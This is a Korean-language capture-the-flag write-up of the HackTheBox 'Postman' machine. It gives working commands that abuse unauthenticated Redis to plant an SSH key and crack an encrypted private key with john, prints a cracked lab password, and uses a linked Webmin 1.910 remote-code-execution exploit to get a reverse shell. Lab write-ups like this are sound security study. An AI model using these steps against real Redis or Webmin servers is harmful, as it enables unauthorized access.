# Postman - HackTheBox
- [Recon](#recon)
- [Shell as Redis](#shell-as-redis)
- [Shell as Matt](#shell-as-matt)
- [Privesc](#privesc)
- [FLAG](#flag)

## Recon
```bash
sudo nmap -p 22,80,6379,10000 -sC -sV -vv -oA postman 10.129.3.80
```
<img width="1205" height="632" alt="image" src="https://github.com/user-attachments/assets/629c2a89-a896-47ec-b97b-b58003e3315f" />

- SSH
- HTTP(80)
- REDIS
- HTTP(10000)

---
## Shell as redis
- `redis-cli`를 사용하여 접속 후 버전 확인.
```bash
redis-cli -h 10.129.3.80
```
<img width="1205" height="129" alt="image" src="https://github.com/user-attachments/assets/364f7a17-d9ce-45d7-aa97-02d66fb61782" />

<br>
<br>

- https://gist.github.com/ziednamouchi/d9b57abc1834d7ce3cf43d4d74479baa
- 로컬의 공개키를 서버에 저장하여 SSH 접속이 가능하게 만드는 취약점.
<img width="1070" height="720" alt="image" src="https://github.com/user-attachments/assets/42f1eb2b-566e-47da-87f8-ea1dd63b20ab" />

<br>
<br>

- 공개키에 위아래로 공백을 줘서 복사.
```bash
(echo '\r\n'; cat ~/.ssh/id_ed25519.pub; echo '\r\n') > public_key.txt
```
<img width="1203" height="270" alt="image" src="https://github.com/user-attachments/assets/8dde0b46-0b4b-468b-a510-f5a8bde7a216" />

<br>
<br>

- 차례대로 명령어를 입력하여 `authorized_keys` 생성.
```bash
redis-cli -h 10.129.3.80 flushall

redis-cli -h 10.129.3.80 -x set cracklist

cat public_key.txt|redis-cli -h 10.129.3.80 -x set cracklist

redis-cli -h 10.129.3.80 config set dir /var/lib/redis/.ssh/

redis-cli -h 10.129.3.80 config set dbfilename "authorized_keys"

redis-cli -h 10.129.3.80 save
```
<img width="1203" height="468" alt="image" src="https://github.com/user-attachments/assets/20c0b14f-f2b7-475d-ba25-30433d1c7f5d" />

<br>
<br>

- SSH 유저명을 알 수 없으나 `redis`유저로 로그인 시도하여 성공.
```bash
ssh -i ~/.ssh/id_ed25519 redis@10.129.3.80
```
<img width="1203" height="604" alt="image" src="https://github.com/user-attachments/assets/9502469f-f2f7-4aeb-9201-29d0e42833c5" />

---
## Shell as Matt
- `/opt`에서 비밀키 발견.
<img width="1203" height="124" alt="image" src="https://github.com/user-attachments/assets/2f536297-1969-420a-b674-e3f0c4b63160" />

<br>
<br>

- 암호화가 되어 있음.
<img width="1203" height="100" alt="image" src="https://github.com/user-attachments/assets/d919f68c-8406-4e05-a230-3d800a9ec17e" />

<br>
<br>

- 로컬로 복사한 후 해시화.
```bash
ssh2john private >hash
```
<img width="1203" height="632" alt="image" src="https://github.com/user-attachments/assets/38572f3f-f490-48ed-b0ec-f4632c22b79f" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="81" alt="image" src="https://github.com/user-attachments/assets/e3e7768c-2459-4902-9a5e-a4403fc13fa9" />

<br>
<br>

- `Matt:computer2008` 로그인 성공.
<img width="1203" height="97" alt="image" src="https://github.com/user-attachments/assets/08e40929-9ec4-4066-bceb-cc2e801e9be3" />

---
## Privesc
- 10000번 포트에서 `Webmin`이 실행중.
<img width="319" height="335" alt="image" src="https://github.com/user-attachments/assets/53df18cd-5d44-4ca3-aaa5-cbfbcb520a96" />

<br>
<br>

- `Matt:computer2008`로 로그인 시도하여 성공.
- Webmin 1.910
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/a366fcd4-192d-466f-ac48-15819441c26c" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2019-12840
<img width="1017" height="324" alt="image" src="https://github.com/user-attachments/assets/e3fe40db-4843-4039-9a5d-7bdf39974ecb" />

<br>
<br>

- https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE
- `perl`언어로 된 리버스 셸 코드를 생성하여 base64로 인코딩한 페이로드를 전달하는 취약점.
<img width="866" height="443" alt="image" src="https://github.com/user-attachments/assets/8a05a739-dec0-48d4-b528-8d2a0a6cf435" />

<br>
<br>

- 수동으로 실패하여 burpsuite로 가로채서 페이로드 확인.
<img width="1545" height="298" alt="image" src="https://github.com/user-attachments/assets/a35c9a11-e833-4915-9b07-39c7675f35af" />

<br>
<br>

- 셸 획득.
<img width="1206" height="149" alt="image" src="https://github.com/user-attachments/assets/60b27b6a-c7b4-465d-a1bf-13f56445549f" />

---
## FLAG
- `/home/Matt/user.txt`
<img width="1206" height="387" alt="image" src="https://github.com/user-attachments/assets/d8b33d9a-b382-409c-9769-e393eb557585" />

<br>
<br>

- `/root/root.txt`
<img width="1202" height="437" alt="image" src="https://github.com/user-attachments/assets/409e2fcd-edf1-4fe9-9b7c-030fb4490d63" />
